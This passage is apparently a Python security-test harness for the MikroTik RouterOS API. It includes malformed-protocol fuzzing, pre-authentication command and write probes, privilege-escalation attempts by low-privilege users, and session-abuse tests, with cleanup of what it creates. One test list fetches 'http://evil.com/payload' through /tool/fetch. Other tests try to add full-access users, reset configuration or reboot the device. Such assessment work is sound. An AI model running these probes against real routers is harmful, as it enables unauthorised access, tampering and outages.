                ev.add_test(cat, "many_words_1000_sentence",
                            "1000 word sentence", "timeout")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "many_words_1000_sentence",
                    "1000 word sentence", f"error: {e}")

    # ── 4.12  Negative length attack (craft invalid encoding manually) ───────
    # Send bytes that look like a 2-byte length but encode a suspicious value
    crafted_lengths = [
        ("two_byte_zero", b'\x80\x00', "2-byte encoding of 0"),
        ("three_byte_zero", b'\xC0\x00\x00', "3-byte encoding of 0"),
        ("four_byte_zero", b'\xE0\x00\x00\x00', "4-byte encoding of 0"),
        ("five_byte_zero", b'\xF0\x00\x00\x00\x00', "5-byte encoding of 0"),
        ("five_byte_one", b'\xF0\x00\x00\x00\x01', "5-byte encoding of 1"),
    ]
    for name, raw_len, desc in crafted_lengths:
        try:
            s = raw_connect(8728, timeout=5)
            # Send crafted length + some data + terminator
            s.sendall(raw_len + b'A' * 16 + b'\x00')
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, f"crafted_len_{name}", desc,
                            f"got {len(resp)} bytes",
                            details={"raw_len_hex": raw_len.hex(),
                                     "response_hex": resp[:50].hex()})
            except:
                ev.add_test(cat, f"crafted_len_{name}", desc,
                            "timeout_or_closed")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"crafted_len_{name}", desc, f"error: {e}")

    health_gate(ev)

    # ── 4.13  Send valid sentence byte-by-byte (slow loris style) ────────────
    try:
        s = raw_connect(8728, timeout=15)
        sentence = encode_sentence(["/login",
                                    f"=name={ADMIN_USER}",
                                    f"=password={ADMIN_PASS}"])
        for byte in sentence:
            s.sendall(bytes([byte]))
            time.sleep(0.05)  # 50ms between bytes
        resp = recv_sentence(s, timeout=5)
        ok = resp and resp[0] == '!done'
        ev.add_test(cat, "slow_loris_byte_by_byte",
                    "Send login sentence one byte at a time (50ms apart)",
                    f"login={'success' if ok else 'failed'}: {words_summary(resp)}",
                    details={"bytes_sent": len(sentence),
                             "total_time": f"{len(sentence)*0.05:.1f}s"})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "slow_loris_byte_by_byte",
                    "Byte-by-byte slow send", f"error: {e}")

    # ── 4.14  Protocol down[REDACTED]: send old-style challenge-response login ────
    try:
        s = raw_connect(8728, timeout=5)
        # Old pre-6.43 login: /login first to get challenge, then hash
        send_sentence(s, ['/login'])
        resp = recv_sentence(s, timeout=3)
        has_ret = False
        challenge = None
        if resp:
            for w in resp:
                if w.startswith("=ret="):
                    has_ret = True
                    challenge = w[5:]
        ev.add_test(cat, "old_style_challenge_login",
                    "Send /login without credentials (old challenge-response probe)",
                    f"has_challenge={has_ret}, response={words_summary(resp)}",
                    details={"challenge": challenge,
                             "response": words_summary(resp)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "old_style_challenge_login",
                    "Old-style login probe", f"error: {e}")

    # ── 4.15  Truncated word: valid length header, connection close mid-word ─
    try:
        s = raw_connect(8728, timeout=5)
        # Encode "/login" word but send only half the payload
        word = encode_word("/login")
        half = max(2, len(word) // 2)
        s.sendall(word[:half])
        time.sleep(0.5)
        safe_close(s)
        # Check router is fine
        time.sleep(1)
        status = check_router_alive()
        ev.add_test(cat, "truncated_word_close",
                    "Send half of a word then close connection",
                    f"router_alive={status.get('alive')}",
                    details=status)
    except Exception as e:
        ev.add_test(cat, "truncated_word_close",
                    "Truncated word test", f"error: {e}")

    # ── 4.16  Overlapping length encodings ───────────────────────────────────
    # Use 2-byte encoding for a value that fits in 1 byte
    overlap_tests = [
        ("2byte_for_5", b'\x80\x05', 5, "2-byte encoding for value 5 (should be 1-byte)"),
        ("3byte_for_100", b'\xC0\x00\x64', 100, "3-byte encoding for value 100"),
        ("4byte_for_200", b'\xE0\x00\x00\xC8', 200, "4-byte encoding for value 200"),
    ]
    for name, raw_len, expected_len, desc in overlap_tests:
        try:
            s = raw_connect(8728, timeout=5)
            payload = raw_len + b'/login' + b'\x00' * max(0, expected_len - 6)
            s.sendall(payload + b'\x00')
            time.sleep(1)
            try:
                resp = s.recv(4096)
                ev.add_test(cat, f"overlap_{name}", desc,
                            f"got {len(resp)} bytes",
                            details={"response_hex": resp[:50].hex()})
            except:
                ev.add_test(cat, f"overlap_{name}", desc,
                            "timeout_or_closed")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"overlap_{name}", desc, f"error: {e}")

    # ── 4.17  API-SSL: send plaintext on SSL port ───────────────────────────
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((TARGET, 8729))
        # Send plaintext RouterOS API data on the SSL port
        s.sendall(encode_sentence(["/login", "=name=admin", "=password=test"]))
        time.sleep(1)
        try:
            resp = s.recv(4096)
            ev.add_test(cat, "plaintext_on_ssl_port",
                        "Send plaintext API data on SSL port 8729",
                        f"got {len(resp)} bytes: {resp[:50].hex()}",
                        details={"response_hex": resp[:100].hex()})
        except:
            ev.add_test(cat, "plaintext_on_ssl_port",
                        "Plaintext on SSL port",
                        "timeout_or_closed (expected)")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "plaintext_on_ssl_port",
                    "Plaintext on SSL port", f"error: {e}")

    # ── 4.18  Multiple commands in a single TCP segment ──────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Pack 5 sentences into one TCP send
            combined = b''
            for i in range(5):
                combined += encode_sentence(["/system/identity/print", f".tag=batch{i}"])
            s.sendall(combined)
            replies = recv_all_sentences(s, timeout=5, max_sentences=20)
            ev.add_test(cat, "batched_tcp_segment",
                        "5 sentences packed into single TCP send",
                        f"{len(replies)} replies",
                        details={"reply_count": len(replies)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "batched_tcp_segment",
                    "Batched TCP segment", f"error: {e}")

    health_gate(ev)

    # ── 4.19  Extremely deeply nested command path ───────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            deep_path = "/" + "/".join(["a"] * 200) + "/print"
            replies = api_command(s, deep_path, timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "deeply_nested_path",
                        "Command with 200-level deep path",
                        f"response: {reply_text[:100]}",
                        details={"path_depth": 200})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "deeply_nested_path",
                    "Deep path test", f"error: {e}")

    # ── 4.20  Word with all printable ASCII chars in it ──────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            all_printable = ''.join(chr(i) for i in range(32, 127))
            replies = api_command(s, "/" + all_printable, timeout=3)
            reply_text = sentence_summary(replies)
            ev.add_test(cat, "all_printable_ascii_command",
                        "Command containing all printable ASCII (32-126)",
                        f"response: {reply_text[:100]}",
                        details={"command_len": len(all_printable)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "all_printable_ascii_command",
                    "All-printable-ASCII test", f"error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  Category 5: Pre-Auth Command Testing (~30 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_preauth_commands(ev):
    log("=" * 60)
    log("Category 5: Pre-Auth Command Testing")
    log("=" * 60)

    cat = "preauth_commands"

    # Commands to test without authentication
    preauth_commands = [
        ("/system/resource/print", "System resource info"),
        ("/system/identity/print", "System identity"),
        ("/user/print", "User list"),
        ("/log/print", "System log"),
        ("/system/reboot", "System reboot"),
        ("/system/shutdown", "System shutdown"),
        ("/file/print", "File list"),
        ("/ip/address/print", "IP addresses"),
        ("/ip/route/print", "Routing table"),
        ("/interface/print", "Interface list"),
        ("/ip/firewall/filter/print", "Firewall rules"),
        ("/system/package/print", "Installed packages"),
        ("/system/script/print", "Scripts"),
        ("/system/scheduler/print", "Scheduled tasks"),
        ("/tool/bandwidth-test", "Bandwidth test"),
        ("/user/active/print", "Active users"),
        ("/certificate/print", "Certificates"),
        ("/ip/dns/print", "DNS settings"),
        ("/ip/service/print", "Enabled services"),
        ("/system/history/print", "Command history"),
        ("/system/logging/print", "Logging config"),
        ("/export", "Configuration export"),
        ("/system/license/print", "License info"),
        ("/ip/neighbor/print", "Neighbor discovery"),
        ("/system/clock/print", "System clock"),
    ]

    info_leaked = []

    for cmd, desc in preauth_commands:
        try:
            s = raw_connect(8728, timeout=5)
            # Do NOT authenticate — send command directly
            replies = api_command(s, cmd, timeout=3)
            reply_text = sentence_summary(replies)

            # Check if we got actual data (not just !trap)
            got_data = False
            got_trap = False
            for r in replies:
                if r and r[0] == '!re':
                    got_data = True
                if r and r[0] == '!trap':
                    got_trap = True

            if got_data:
                info_leaked.append(cmd)

            ev.add_test(cat, f"preauth_{cmd.replace('/', '_').strip('_')}",
                        f"Pre-auth: {desc}",
                        "DATA_RETURNED" if got_data else
                        ("trapped" if got_trap else f"response: {reply_text[:80]}"),
                        details={"command": cmd,
                                 "response_summary": reply_text[:200]},
                        anomaly=got_data)

            if got_data:
                ev.add_finding("HIGH",
                               f"Pre-auth information disclosure: {cmd}",
                               f"Command {cmd} returns data without authentication. "
                               f"Response: {reply_text[:200]}",
                               cwe="CWE-200",
                               evidence_refs=[f"preauth_{cmd.replace('/', '_').strip('_')}"])

            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"preauth_{cmd.replace('/', '_').strip('_')}",
                        f"Pre-auth: {desc}", f"error: {e}")

        health_gate(ev)

    # ── 5.2  Pre-auth write attempts ─────────────────────────────────────────
    preauth_write_commands = [
        ("/user/add", {"name": "hacker", "password": "pwned", "group": "full"},
         "Add user without auth"),
        ("/system/identity/set", {"name": "PWNED"},
         "Set identity without auth"),
        ("/ip/address/add", {"address": "[REDACTED-IP]/32", "interface": "ether1"},
         "Add IP without auth"),
        ("/system/script/add", {"name": "evil", "source": ":log info pwned"},
         "Add script without auth"),
    ]
    for cmd, attrs, desc in preauth_write_commands:
        try:
            s = raw_connect(8728, timeout=5)
            replies = api_command(s, cmd, attrs=attrs, timeout=3)
            reply_text = sentence_summary(replies)
            success = any(r[0] == '!done' and len(r) > 1 for r in replies if r)
            # Also check for !done without !trap
            no_trap = not any(r[0] == '!trap' for r in replies if r)
            ev.add_test(cat, f"preauth_write_{cmd.replace('/', '_').strip('_')}",
                        f"Pre-auth write: {desc}",
                        "WRITE_SUCCESS" if success else f"blocked: {reply_text[:100]}",
                        anomaly=success)
            if success:
                ev.add_finding("CRITICAL",
                               f"Pre-auth write: {cmd}",
                               f"Write command {cmd} succeeded without auth: {reply_text[:200]}",
                               cwe="CWE-306")
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"preauth_write_{cmd.replace('/', '_').strip('_')}",
                        f"Pre-auth write: {desc}", f"error: {e}")

    # ── 5.3  Pre-auth raw binary / protocol confusion ──────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        # Send what looks like an authenticated command (with a .tag)
        send_sentence(s, ["/system/resource/print", ".tag=sneaky"])
        replies = recv_all_sentences(s, timeout=3)
        reply_text = sentence_summary(replies)
        got_data = any(r[0] == '!re' for r in replies if r)
        ev.add_test(cat, "preauth_tagged_command",
                    "Pre-auth command with .tag attribute (bypass attempt)",
                    "DATA_LEAKED" if got_data else f"blocked: {reply_text[:80]}",
                    anomaly=got_data)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "preauth_tagged_command",
                    "Pre-auth tagged command", f"error: {e}")

    # ── 5.4  Pre-auth: send /login then command without waiting for reply ────
    try:
        s = raw_connect(8728, timeout=5)
        # Send login and command immediately (race condition attempt)
        data = encode_sentence(["/login", f"=name={ADMIN_USER}",
                                f"=password={ADMIN_PASS}"])
        data += encode_sentence(["/user/print"])
        s.sendall(data)
        replies = recv_all_sentences(s, timeout=5)
        # Check if user data was returned
        got_user_data = False
        for r in replies:
            if r and r[0] == '!re':
                r_str = " ".join(r)
                if "name" in r_str:
                    got_user_data = True
        ev.add_test(cat, "preauth_race_login_command",
                    "Send login + command in single TCP send (race condition)",
                    f"user_data_returned={got_user_data}, replies={len(replies)}",
                    details={"reply_count": len(replies),
                             "response": sentence_summary(replies)[:200]})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "preauth_race_login_command",
                    "Race condition login+command", f"error: {e}")

    # ── 5.5  Pre-auth: send only attribute words (no command word) ───────────
    try:
        s = raw_connect(8728, timeout=5)
        send_sentence(s, ["=name=admin", "=password=TestPass123"])
        resp = recv_sentence(s, timeout=3)
        ev.add_test(cat, "preauth_attrs_only_no_command",
                    "Send attribute words without command word (no /login)",
                    f"response: {words_summary(resp)}",
                    details={"response": words_summary(resp)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "preauth_attrs_only_no_command",
                    "Attributes without command", f"error: {e}")

    # ── 5.6  Pre-auth: send !done sentence (mimic server reply) ─────────────
    try:
        s = raw_connect(8728, timeout=5)
        send_sentence(s, ["!done"])
        time.sleep(0.5)
        # Try a command after sending fake server reply
        replies = api_command(s, "/system/identity/print", timeout=3)
        reply_text = sentence_summary(replies)
        got_data = any(r[0] == '!re' for r in replies if r)
        ev.add_test(cat, "preauth_send_done_sentence",
                    "Send !done (server reply) then try command",
                    "DATA_LEAKED" if got_data else f"blocked: {reply_text[:80]}",
                    anomaly=got_data)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "preauth_send_done_sentence",
                    "Send !done pre-auth", f"error: {e}")

    # ── 5.7  Pre-auth: send !fatal to see server reaction ───────────────────
    try:
        s = raw_connect(8728, timeout=5)
        send_sentence(s, ["!fatal", "=message=test"])
        time.sleep(1)
        try:
            resp = s.recv(4096)
            ev.add_test(cat, "preauth_send_fatal",
                        "Send !fatal sentence to server",
                        f"got {len(resp)} bytes: {resp[:50].hex()}")
        except:
            ev.add_test(cat, "preauth_send_fatal",
                        "Send !fatal sentence",
                        "connection_closed_or_timeout")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "preauth_send_fatal",
                    "Send !fatal pre-auth", f"error: {e}")

    health_gate(ev)

    # Summary
    if info_leaked:
        ev.add_test(cat, "preauth_summary",
                    f"Pre-auth information disclosure summary",
                    f"{len(info_leaked)} commands leaked data",
                    details={"leaked_commands": info_leaked},
                    anomaly=True)


# ══════════════════════════════════════════════════════════════════════════════
#  Category 6: Post-Auth Privilege Testing (~30 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_postauth_privilege(ev):
    log("=" * 60)
    log("Category 6: Post-Auth Privilege Testing")
    log("=" * 60)

    cat = "privilege_escalation"

    # ── 6.1  testread user: try write operations ─────────────────────────────
    read_user = "testread"
    read_pass = USERS[read_user]["password"]

    read_write_tests = [
        ("/ip/address/add", {"address": "[REDACTED-INTERNAL-IP]/24", "interface": "ether1"},
         "Add IP address"),
        ("/user/add", {"name": "hacker_via_read", "password": "pwned123", "group": "full"},
         "Add user"),
        ("/system/identity/set", {"name": "PWNED_BY_READ"},
         "Set system identity"),
        ("/system/script/add", {"name": "evil_script", "source": ":log info pwned"},
         "Add script"),
        ("/tool/fetch", {"url": "http://evil.com/payload", "dst-path": "payload"},
         "Fetch remote file"),
        ("/system/reboot", {},
         "Reboot system"),
        ("/file/remove", {"numbers": "0"},
         "Delete file"),
        ("/ip/firewall/filter/add",
         {"chain": "input", "action": "accept", "comment": "evil_rule"},
         "Add firewall rule"),
        ("/system/scheduler/add",
         {"name": "evil_sched", "interval": "1h", "on-event": ":log info pwned"},
         "Add scheduler task"),
        ("/ip/dns/set", {"servers": "[REDACTED-IP]"},
         "Change DNS servers"),
        ("/system/logging/add", {"topics": "info", "action": "remote"},
         "Add logging target"),
        ("/certificate/add", {"name": "evil_cert", "common-name": "evil"},
         "Add certificate"),
    ]

    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, read_user, read_pass)
        if ok:
            for cmd, attrs, desc in read_write_tests:
                try:
                    replies = api_command(s, cmd, attrs=attrs, timeout=3)
                    reply_text = sentence_summary(replies)
                    # Check if command succeeded (no !trap)
                    trapped = any(r[0] == '!trap' for r in replies if r)
                    done = any(r[0] == '!done' for r in replies if r)
                    success = done and not trapped

                    ev.add_test(cat,
                                f"read_user_{cmd.replace('/', '_').strip('_')}",
                                f"Read user ({read_user}): {desc}",
                                "ALLOWED" if success else f"denied: {reply_text[:100]}",
                                details={"user": read_user, "command": cmd,
                                         "response": reply_text[:200]},
                                anomaly=success)

                    if success:
                        ev.add_finding("HIGH",
                                       f"Privilege escalation: read user can {desc}",
                                       f"User '{read_user}' (read group) successfully executed "
                                       f"write command: {cmd}",
                                       cwe="CWE-269",
                                       evidence_refs=[f"read_user_{cmd.replace('/', '_').strip('_')}"])
                except Exception as e:
                    ev.add_test(cat,
                                f"read_user_{cmd.replace('/', '_').strip('_')}",
                                f"Read user: {desc}", f"error: {e}")
        else:
            ev.add_test(cat, "read_user_login",
                        f"Login as {read_user}",
                        "failed", anomaly=True)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "read_user_test_block",
                    "Read user privilege tests", f"connection error: {e}")

    health_gate(ev)

    # ── 6.2  testwrite user: try admin-only operations ───────────────────────
    write_user = "testwrite"
    write_pass = USERS[write_user]["password"]

    write_admin_tests = [
        ("/user/add", {"name": "hacker_via_write", "password": "pwned123", "group": "full"},
         "Add full-access user"),
        ("/user/set", {"numbers": "0", "group": "full"},
         "Modify admin user group"),
        ("/certificate/add", {"name": "evil_cert2", "common-name": "evil"},
         "Add certificate"),
        ("/system/license/print", {},
         "View license (admin only)"),
        ("/system/reset-configuration", {},
         "Reset configuration"),
        ("/system/package/update/check-for-updates", {},
         "Check for updates"),
        ("/user/group/print", {},
         "List user groups"),
        ("/user/group/add", {"name": "superadmin", "policy": "full,read,write,api,ssh"},
         "Add user group"),
    ]

    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, write_user, write_pass)
        if ok:
            for cmd, attrs, desc in write_admin_tests:
                try:
                    replies = api_command(s, cmd, attrs=attrs, timeout=3)
                    reply_text = sentence_summary(replies)
                    trapped = any(r[0] == '!trap' for r in replies if r)
                    done = any(r[0] == '!done' for r in replies if r)
                    got_data = any(r[0] == '!re' for r in replies if r)
                    success = (done or got_data) and not trapped

                    ev.add_test(cat,
                                f"write_user_{cmd.replace('/', '_').strip('_')}",
                                f"Write user ({write_user}): {desc}",
                                "ALLOWED" if success else f"denied: {reply_text[:100]}",
                                details={"user": write_user, "command": cmd,
                                         "response": reply_text[:200]},
                                anomaly=success and "user/add" in cmd)

                    if success and any(x in cmd for x in ["/user/add", "/user/set",
                                                           "/user/group/add",
                                                           "/system/reset"]):
                        ev.add_finding("HIGH",
                                       f"Privilege escalation: write user can {desc}",
                                       f"User '{write_user}' (write group) executed "
                                       f"admin command: {cmd}",
                                       cwe="CWE-269")
                except Exception as e:
                    ev.add_test(cat,
                                f"write_user_{cmd.replace('/', '_').strip('_')}",
                                f"Write user: {desc}", f"error: {e}")
        else:
            ev.add_test(cat, "write_user_login",
                        f"Login as {write_user}",
                        "failed", anomaly=True)
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "write_user_test_block",
                    "Write user privilege tests", f"connection error: {e}")

    health_gate(ev)

    # ── 6.3  Check if API policy is enforced per-user ────────────────────────
    # Some groups may not have "api" policy — try login
    for username, info in USERS.items():
        try:
            s = raw_connect(8728, timeout=3)
            ok, resp = api_login(s, username, info["password"])
            if ok:
                # Try reading own group permissions
                replies = api_command(s, "/user/print",
                                      queries=[f"?name={username}"], timeout=3)
                reply_text = sentence_summary(replies)
                ev.add_test(cat, f"api_policy_{username}",
                            f"User {username} API access + read own record",
                            f"login_ok, query: {reply_text[:100]}",
                            details={"user": username, "group": info["group"]})
            else:
                ev.add_test(cat, f"api_policy_{username}",
                            f"User {username} API access",
                            f"login_denied: {words_summary(resp)}",
                            details={"user": username, "group": info["group"]})
            safe_close(s)
        except Exception as e:
            ev.add_test(cat, f"api_policy_{username}",
                        f"API policy for {username}", f"error: {e}")

    # ── 6.4  testread: try reading sensitive data ─────────────────────────────
    sensitive_read_commands = [
        ("/user/print", "List all users (including passwords?)"),
        ("/system/history/print", "Command history"),
        ("/ip/service/print", "Enabled services and ports"),
        ("/certificate/print", "Certificates"),
        ("/system/logging/print", "Logging configuration"),
        ("/ip/firewall/filter/print", "Firewall rules"),
        ("/ip/dns/print", "DNS configuration"),
        ("/file/print", "Files on disk"),
        ("/system/package/print", "Installed packages"),
        ("/system/routerboard/print", "Hardware info"),
    ]
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, "testread", USERS["testread"]["password"])
        if ok:
            for cmd, desc in sensitive_read_commands:
                try:
                    replies = api_command(s, cmd, timeout=3)
                    got_data = any(r[0] == '!re' for r in replies if r)
                    trapped = any(r[0] == '!trap' for r in replies if r)
                    ev.add_test(cat,
                                f"read_user_read_{cmd.replace('/', '_').strip('_')}",
                                f"Read user reads: {desc}",
                                "data_returned" if got_data else
                                ("denied" if trapped else "no_data"),
                                details={"command": cmd,
                                         "response": sentence_summary(replies)[:100]})
                except Exception as e:
                    ev.add_test(cat,
                                f"read_user_read_{cmd.replace('/', '_').strip('_')}",
                                f"Read user reads: {desc}", f"error: {e}")
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "read_user_sensitive_reads",
                    "Read user sensitive data access", f"error: {e}")

    health_gate(ev)

    # ── 6.5  Cleanup any created objects ─────────────────────────────────────
    log("  Cleaning up any objects created during privilege tests...")
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            # Remove users that may have been created
            for uname in ["hacker_via_read", "hacker_via_write", "hacker"]:
                try:
                    # Find user ID
                    replies = api_command(s, "/user/print",
                                          queries=[f"?name={uname}"], timeout=3)
                    for r in replies:
                        if r[0] == '!re':
                            for attr in r[1:]:
                                if attr.startswith("=.id="):
                                    uid = attr.split("=", 2)[2]
                                    api_command(s, "/user/remove",
                                                attrs={".id": uid}, timeout=3)
                                    log(f"    Removed user: {uname}")
                except:
                    pass

            # Remove scripts
            for sname in ["evil_script", "evil"]:
                try:
                    replies = api_command(s, "/system/script/print",
                                          queries=[f"?name={sname}"], timeout=3)
                    for r in replies:
                        if r[0] == '!re':
                            for attr in r[1:]:
                                if attr.startswith("=.id="):
                                    sid = attr.split("=", 2)[2]
                                    api_command(s, "/system/script/remove",
                                                attrs={".id": sid}, timeout=3)
                                    log(f"    Removed script: {sname}")
                except:
                    pass

            # Remove scheduler
            for sname in ["evil_sched"]:
                try:
                    replies = api_command(s, "/system/scheduler/print",
                                          queries=[f"?name={sname}"], timeout=3)
                    for r in replies:
                        if r[0] == '!re':
                            for attr in r[1:]:
                                if attr.startswith("=.id="):
                                    sid = attr.split("=", 2)[2]
                                    api_command(s, "/system/scheduler/remove",
                                                attrs={".id": sid}, timeout=3)
                                    log(f"    Removed scheduler: {sname}")
                except:
                    pass

            # Remove firewall rules with evil comment
            try:
                replies = api_command(s, "/ip/firewall/filter/print",
                                      queries=["?comment=evil_rule"], timeout=3)
                for r in replies:
                    if r[0] == '!re':
                        for attr in r[1:]:
                            if attr.startswith("=.id="):
                                fid = attr.split("=", 2)[2]
                                api_command(s, "/ip/firewall/filter/remove",
                                            attrs={".id": fid}, timeout=3)
                                log(f"    Removed firewall rule: evil_rule")
            except:
                pass

            # Restore identity
            try:
                api_command(s, "/system/identity/set",
                            attrs={"name": "MikroTik"}, timeout=3)
            except:
                pass

            # Remove user groups
            for gname in ["superadmin"]:
                try:
                    replies = api_command(s, "/user/group/print",
                                          queries=[f"?name={gname}"], timeout=3)
                    for r in replies:
                        if r[0] == '!re':
                            for attr in r[1:]:
                                if attr.startswith("=.id="):
                                    gid = attr.split("=", 2)[2]
                                    api_command(s, "/user/group/remove",
                                                attrs={".id": gid}, timeout=3)
                                    log(f"    Removed group: {gname}")
                except:
                    pass

        safe_close(s)
    except Exception as e:
        log(f"  Cleanup error: {e}")


# ══════════════════════════════════════════════════════════════════════════════
#  Category 7: Session / State Machine Abuse (~20 tests)
# ══════════════════════════════════════════════════════════════════════════════

def test_session_abuse(ev):
    log("=" * 60)
    log("Category 7: Session / State Machine Abuse")
    log("=" * 60)

    cat = "session_abuse"

    # ── 7.1  Send commands after disconnect + reconnect (no re-auth) ─────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        safe_close(s)

        # Reconnect without authenticating
        s2 = raw_connect(8728, timeout=5)
        replies = api_command(s2, "/system/resource/print", timeout=3)
        reply_text = sentence_summary(replies)
        got_data = any(r[0] == '!re' for r in replies if r)
        ev.add_test(cat, "reconnect_no_reauth",
                    "Disconnect, reconnect, send command without re-auth",
                    "DATA_LEAKED" if got_data else f"blocked: {reply_text[:100]}",
                    anomaly=got_data)
        if got_data:
            ev.add_finding("CRITICAL",
                           "Session persists across reconnections",
                           "After disconnect and reconnect, commands execute "
                           "without re-authentication",
                           cwe="CWE-613")
        safe_close(s2)
    except Exception as e:
        ev.add_test(cat, "reconnect_no_reauth",
                    "Reconnect without re-auth", f"error: {e}")

    # ── 7.2  Rapid connect/disconnect cycles ─────────────────────────────────
    cycle_results = []
    for i in range(20):
        try:
            s = raw_connect(8728, timeout=2)
            safe_close(s)
            cycle_results.append("ok")
        except Exception as e:
            cycle_results.append(f"fail: {e}")

    failures = sum(1 for r in cycle_results if r.startswith("fail"))
    ev.add_test(cat, "rapid_connect_disconnect_20x",
                "20 rapid connect/disconnect cycles",
                f"{20 - failures}/20 succeeded, {failures} failed",
                details={"failures": [r for r in cycle_results if r != "ok"]},
                anomaly=failures > 5)

    health_gate(ev)

    # ── 7.3  Login twice on same connection (session confusion) ──────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok1, resp1 = api_login(s, ADMIN_USER, ADMIN_PASS)
        # Login again as different user on same socket
        ok2, resp2 = api_login(s, "testread", USERS["testread"]["password"])

        # Now check which user we are
        replies = api_command(s, "/user/print",
                              queries=["?name=admin"], timeout=3)
        reply_text = sentence_summary(replies)

        ev.add_test(cat, "double_login_same_socket",
                    "Login as admin, then re-login as testread on same socket",
                    f"first={'ok' if ok1 else 'fail'}, second={'ok' if ok2 else 'fail'}, "
                    f"query: {reply_text[:80]}",
                    details={"first_user": ADMIN_USER,
                             "second_user": "testread",
                             "first_login": words_summary(resp1),
                             "second_login": words_summary(resp2)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "double_login_same_socket",
                    "Double login on same socket", f"error: {e}")

    # ── 7.4  Login as admin, then re-login as read — check write access ──────
    try:
        s = raw_connect(8728, timeout=5)
        ok1, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        ok2, _ = api_login(s, "testread", USERS["testread"]["password"])

        if ok2:
            # Try a write command that read user shouldn't have access to
            replies = api_command(s, "/system/identity/set",
                                  attrs={"name": "CONFUSION_TEST"}, timeout=3)
            reply_text = sentence_summary(replies)
            trapped = any(r[0] == '!trap' for r in replies if r)
            ev.add_test(cat, "session_confusion_privilege_check",
                        "After admin->testread re-login, try write command",
                        "denied" if trapped else f"allowed: {reply_text[:80]}",
                        details={"response": reply_text[:200]},
                        anomaly=not trapped)
            if not trapped:
                ev.add_finding("HIGH",
                               "Session confusion: re-login preserves prior privileges",
                               "After re-login from admin to testread, write commands "
                               "still succeed with admin privileges",
                               cwe="CWE-269")

            # Restore identity if changed
            try:
                api_command(s, "/system/identity/set",
                            attrs={"name": "MikroTik"}, timeout=2)
            except:
                pass
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "session_confusion_privilege_check",
                    "Session confusion privilege test", f"error: {e}")

    health_gate(ev)

    # ── 7.5  Multiple simultaneous authenticated sessions ────────────────────
    try:
        sessions = []
        for i in range(5):
            s = raw_connect(8728, timeout=3)
            ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
            if ok:
                sessions.append(s)

        # Use all sessions concurrently
        working = 0
        for i, s in enumerate(sessions):
            try:
                replies = api_command(s, "/system/identity/print", timeout=3)
                if replies:
                    working += 1
            except:
                pass

        ev.add_test(cat, "multi_session_concurrent",
                    "5 simultaneous admin sessions, all issue commands",
                    f"{working}/5 working",
                    details={"opened": len(sessions), "working": working})

        for s in sessions:
            safe_close(s)
    except Exception as e:
        ev.add_test(cat, "multi_session_concurrent",
                    "Multiple concurrent sessions", f"error: {e}")

    # ── 7.6  Send command, then immediately close before reading reply ───────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            send_sentence(s, ["/system/resource/print"])
            safe_close(s)
            # Verify router is fine
            time.sleep(1)
            status = check_router_alive()
            ev.add_test(cat, "send_and_close",
                        "Send command then immediately close socket",
                        f"router_alive={status.get('alive')}",
                        details=status)
        else:
            ev.add_test(cat, "send_and_close",
                        "Send and close test", "auth_failed")
    except Exception as e:
        ev.add_test(cat, "send_and_close",
                    "Send and close", f"error: {e}")

    # ── 7.7  Use /cancel on nonexistent tag ──────────────────────────────────
    try:
        s = raw_connect(8728, timeout=5)
        ok, _ = api_login(s, ADMIN_USER, ADMIN_PASS)
        if ok:
            send_sentence(s, ["/cancel", "=tag=99999"])
            resp = recv_sentence(s, timeout=3)
            # Check if session is still alive
            replies = api_command(s, "/system/identity/print", timeout=3)
            alive = bool(replies)
            ev.add_test(cat, "cancel_nonexistent_tag",
                        "Cancel nonexistent tag (=tag=99999)",
                        f"session_alive={alive}, cancel_resp={words_summary(resp)}",
                        details={"cancel_response": words_summary(resp)})
        safe_close(s)
    except Exception as e:
        ev.add_test(cat, "cancel_nonexistent_tag",
                    "Cancel nonexistent tag", f"error: {e}")

    # ── 7.8  Tag collision: two commands with same tag ───────────────────────
    try:
        s = raw_connect(8728, timeout=5)
